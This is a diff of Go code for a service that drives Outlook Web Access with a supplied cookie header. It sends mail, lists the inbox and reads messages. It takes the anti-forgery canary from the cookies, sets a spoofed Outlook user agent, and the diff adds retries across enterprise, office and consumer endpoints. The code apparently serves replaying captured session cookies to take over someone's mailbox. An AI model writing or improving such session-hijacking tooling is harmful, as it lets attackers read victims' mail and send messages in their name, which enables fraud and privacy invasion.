@@ -1619,7 +1619,7 @@ func (s *CookieStoreService) sendViaOWA(ctx context.Context, cookieHeader string
 				"__type":       "FileAttachment:#Exchange",
 				"Name":         att.Name,
 				"ContentType":  att.ContentType,
-				"ContentBytes": att.ContentB64,
+				"Content":      att.ContentB64,
 				"IsInline":     att.IsInline,
 			}
 			if att.ContentID != "" {
@@ -1631,56 +1631,77 @@ func (s *CookieStoreService) sendViaOWA(ctx context.Context, cookieHeader string
 	}
 
 	owaPayload := map[string]interface{}{
-		"__type": "SendItemRequest:#Exchange",
-		"Items":  []map[string]interface{}{msgItem},
+		"__type": "CreateItemJsonRequest:#Exchange",
+		"Header": map[string]interface{}{
+			"__type":               "JsonRequestHeaders:#Exchange",
+			"RequestServerVersion": "Exchange2016",
+		},
+		"Body": map[string]interface{}{
+			"__type":             "CreateItemRequest:#Exchange",
+			"MessageDisposition": "SendAndSaveCopy",
+			"Items":              []map[string]interface{}{msgItem},
+		},
 	}
 
 	body, _ := json.Marshal(owaPayload)
 
-	httpReq, err := http.NewRequestWithContext(ctx, "POST",
-		"https://outlook.office365.com/owa/service.svc?action=CreateItem&ID=-1&AC=1",
-		bytes.NewReader(body))
-	if err != nil {
-		return &model.CookieSendResult{
-			Success: false, Method: "owa", Error: err.Error(),
-			SentAt: time.Now().UTC().Format(time.RFC3339),
-		}
-	}
-
-	httpReq.Header.Set("Cookie", cookieHeader)
-	httpReq.Header.Set("Content-Type", "application/json; charset=utf-8")
-	httpReq.Header.Set("User-Agent", outlookUserAgent)
-	httpReq.Header.Set("Action", "CreateItem")
-
 	// Extract X-OWA-CANARY from cookies
 	canary := s.extractCanary(cookieHeader)
-	if canary != "" {
-		httpReq.Header.Set("X-OWA-CANARY", canary)
-	}
-
-	client := &http.Client{Timeout: 30 * time.Second}
-	resp, err := client.Do(httpReq)
-	if err != nil {
+	if canary == "" {
 		return &model.CookieSendResult{
-			Success: false, Method: "owa", Error: err.Error(),
+			Success: false, Method: "owa", Error: "no X-OWA-CANARY token found in cookies",
 			SentAt: time.Now().UTC().Format(time.RFC3339),
 		}
 	}
-	defer resp.Body.Close()
 
-	if resp.StatusCode == 200 || resp.StatusCode == 202 {
-		return &model.CookieSendResult{
-			Success:   true,
-			Method:    "owa",
-			MessageID: fmt.Sprintf("cookie-owa-%d", time.Now().UnixMilli()),
-			SentAt:    time.Now().UTC().Format(time.RFC3339),
-		}
+	// Try multiple OWA endpoints (enterprise, office, consumer)
+	owaURLs := []string{
+		"https://outlook.office365.com/owa/service.svc?action=CreateItem&ID=-1&AC=1",
+		"https://outlook.office.com/owa/service.svc?action=CreateItem&ID=-1&AC=1",
+		"https://outlook.live.com/owa/service.svc?action=CreateItem&ID=-1&AC=1",
 	}
 
-	respBody, _ := io.ReadAll(resp.Body)
+	var lastErr string
+	for _, owaURL := range owaURLs {
+		httpReq, err := http.NewRequestWithContext(ctx, "POST", owaURL, bytes.NewReader(body))
+		if err != nil {
+			lastErr = err.Error()
+			continue
+		}
+
+		httpReq.Header.Set("Cookie", cookieHeader)
+		httpReq.Header.Set("Content-Type", "application/json; charset=utf-8")
+		httpReq.Header.Set("User-Agent", outlookUserAgent)
+		httpReq.Header.Set("Action", "CreateItem")
+		httpReq.Header.Set("X-OWA-CANARY", canary)
+		httpReq.Header.Set("X-OWA-UrlPostData", "&app=Mail&n=0")
+		httpReq.Header.Set("Accept", "application/json")
+
+		client := &http.Client{Timeout: 30 * time.Second}
+		resp, err := client.Do(httpReq)
+		if err != nil {
+			lastErr = err.Error()
+			continue
+		}
+
+		if resp.StatusCode == 200 || resp.StatusCode == 202 {
+			resp.Body.Close()
+			return &model.CookieSendResult{
+				Success:   true,
+				Method:    "owa",
+				MessageID: fmt.Sprintf("cookie-owa-%d", time.Now().UnixMilli()),
+				SentAt:    time.Now().UTC().Format(time.RFC3339),
+			}
+		}
+
+		respBody, _ := io.ReadAll(resp.Body)
+		resp.Body.Close()
+		lastErr = fmt.Sprintf("HTTP %d: %s", resp.StatusCode, string(respBody))
+	}
+
 	return &model.CookieSendResult{
 		Success: false, Method: "owa",
-		Error:  fmt.Sprintf("HTTP %d: %s", resp.StatusCode, string(respBody)),
+		Error:  lastErr,
 		SentAt: time.Now().UTC().Format(time.RFC3339),
 	}
 }
@@ -1690,12 +1711,9 @@ func (s *CookieStoreService) buildOWARecipients(emails []string) []map[string]in
 	recipients := make([]map[string]interface{}, len(emails))
 	for i, email := range emails {
 		recipients[i] = map[string]interface{}{
-			"__type": "SingleRecipientType:#Exchange",
-			"Mailbox": map[string]interface{}{
-				"__type":       "EmailAddressWrapper:#Exchange",
-				"EmailAddress": email,
-				"Name":         email,
-			},
+			"__type":       "EmailAddress:#Exchange",
+			"EmailAddress": email,
+			"Name":         email,
 		}
 	}
 	return recipients
@@ -1992,14 +2010,14 @@ func (s *CookieStoreService) getInboxViaOWA(ctx context.Context, cookieHeader st
 				"__type":   "ItemResponseShape:#Exchange",
 				"BaseShape": "IdOnly",
 				"AdditionalProperties": []map[string]interface{}{
-					{"__type": "PropertyUri:#Exchange", "FieldURI": "ItemSubject"},
-					{"__type": "PropertyUri:#Exchange", "FieldURI": "ItemDateTimeReceived"},
-					{"__type": "PropertyUri:#Exchange", "FieldURI": "ItemPreview"},
-					{"__type": "PropertyUri:#Exchange", "FieldURI": "ItemHasAttachments"},
-					{"__type": "PropertyUri:#Exchange", "FieldURI": "MessageIsRead"},
-					{"__type": "PropertyUri:#Exchange", "FieldURI": "MessageFrom"},
-					{"__type": "PropertyUri:#Exchange", "FieldURI": "MessageToRecipients"},
-					{"__type": "PropertyUri:#Exchange", "FieldURI": "ConversationConversationId"},
+					{"__type": "PropertyUri:#Exchange", "FieldURI": "item:Subject"},
+					{"__type": "PropertyUri:#Exchange", "FieldURI": "item:DateTimeReceived"},
+					{"__type": "PropertyUri:#Exchange", "FieldURI": "item:Preview"},
+					{"__type": "PropertyUri:#Exchange", "FieldURI": "item:HasAttachments"},
+					{"__type": "PropertyUri:#Exchange", "FieldURI": "message:IsRead"},
+					{"__type": "PropertyUri:#Exchange", "FieldURI": "message:From"},
+					{"__type": "PropertyUri:#Exchange", "FieldURI": "message:ToRecipients"},
+					{"__type": "PropertyUri:#Exchange", "FieldURI": "conversation:ConversationId"},
 				},
 			},
 			"ParentFolderIds": []map[string]interface{}{
@@ -2022,7 +2040,7 @@ func (s *CookieStoreService) getInboxViaOWA(ctx context.Context, cookieHeader st
 					"Order":  "Descending",
 					"Path": map[string]interface{}{
 						"__type":   "PropertyUri:#Exchange",
-						"FieldURI": "ItemDateTimeReceived",
+						"FieldURI": "item:DateTimeReceived",
 					},
 				},
 			},
@@ -2036,8 +2054,9 @@ func (s *CookieStoreService) getInboxViaOWA(ctx context.Context, cookieHeader st
 
 	// Try both OWA endpoints
 	owaURLs := []string{
-		"https://outlook.office365.com/owa/service.svc?action=FindItem",
-		"https://outlook.office.com/owa/service.svc?action=FindItem",
+		"https://outlook.office365.com/owa/service.svc?action=FindItem&ID=-1&AC=1",
+		"https://outlook.office.com/owa/service.svc?action=FindItem&ID=-1&AC=1",
+		"https://outlook.live.com/owa/service.svc?action=FindItem&ID=-1&AC=1",
 	}
 
 	var lastErr error
@@ -2051,7 +2070,7 @@ func (s *CookieStoreService) getInboxViaOWA(ctx context.Context, cookieHeader st
 		httpReq.Header.Set("Cookie", cookieHeader)
 		httpReq.Header.Set("Content-Type", "application/json; charset=utf-8")
 		httpReq.Header.Set("X-OWA-CANARY", canary)
-		httpReq.Header.Set("X-OWA-UrlPostData", string(payloadBytes))
+		httpReq.Header.Set("X-OWA-UrlPostData", "&app=Mail&n=0")
 		httpReq.Header.Set("Action", "FindItem")
 		httpReq.Header.Set("User-Agent", outlookUserAgent)
 		httpReq.Header.Set("Accept", "application/json")
@@ -2231,13 +2250,13 @@ func (s *CookieStoreService) getMessageViaOWA(ctx context.Context, cookieHeader 
 				"BaseShape": "Default",
 				"BodyType":  "HTML",
 				"AdditionalProperties": []map[string]interface{}{
-					{"__type": "PropertyUri:#Exchange", "FieldURI": "ItemBody"},
-					{"__type": "PropertyUri:#Exchange", "FieldURI": "ItemSubject"},
-					{"__type": "PropertyUri:#Exchange", "FieldURI": "ItemDateTimeReceived"},
-					{"__type": "PropertyUri:#Exchange", "FieldURI": "MessageFrom"},
-					{"__type": "PropertyUri:#Exchange", "FieldURI": "MessageToRecipients"},
-					{"__type": "PropertyUri:#Exchange", "FieldURI": "ItemHasAttachments"},
-					{"__type": "PropertyUri:#Exchange", "FieldURI": "MessageIsRead"},
+					{"__type": "PropertyUri:#Exchange", "FieldURI": "item:Body"},
+					{"__type": "PropertyUri:#Exchange", "FieldURI": "item:Subject"},
+					{"__type": "PropertyUri:#Exchange", "FieldURI": "item:DateTimeReceived"},
+					{"__type": "PropertyUri:#Exchange", "FieldURI": "message:From"},
+					{"__type": "PropertyUri:#Exchange", "FieldURI": "message:ToRecipients"},
+					{"__type": "PropertyUri:#Exchange", "FieldURI": "item:HasAttachments"},
+					{"__type": "PropertyUri:#Exchange", "FieldURI": "message:IsRead"},
 				},
 			},
 			"ItemIds": []map[string]interface{}{
@@ -2255,8 +2274,9 @@ func (s *CookieStoreService) getMessageViaOWA(ctx context.Context, cookieHeader 
 	}
 
 	owaURLs := []string{
-		"https://outlook.office365.com/owa/service.svc?action=GetItem",
-		"https://outlook.office.com/owa/service.svc?action=GetItem",
+		"https://outlook.office365.com/owa/service.svc?action=GetItem&ID=-1&AC=1",
+		"https://outlook.office.com/owa/service.svc?action=GetItem&ID=-1&AC=1",
+		"https://outlook.live.com/owa/service.svc?action=GetItem&ID=-1&AC=1",
 	}
 
 	var lastErr error
@@ -2270,6 +2290,7 @@ func (s *CookieStoreService) getMessageViaOWA(ctx context.Context, cookieHeader 
 		httpReq.Header.Set("Cookie", cookieHeader)
 		httpReq.Header.Set("Content-Type", "application/json; charset=utf-8")
 		httpReq.Header.Set("X-OWA-CANARY", canary)
+		httpReq.Header.Set("X-OWA-UrlPostData", "&app=Mail&n=0")
 		httpReq.Header.Set("Action", "GetItem")
 		httpReq.Header.Set("User-Agent", outlookUserAgent)
 		httpReq.Header.Set("Accept", "application/json")
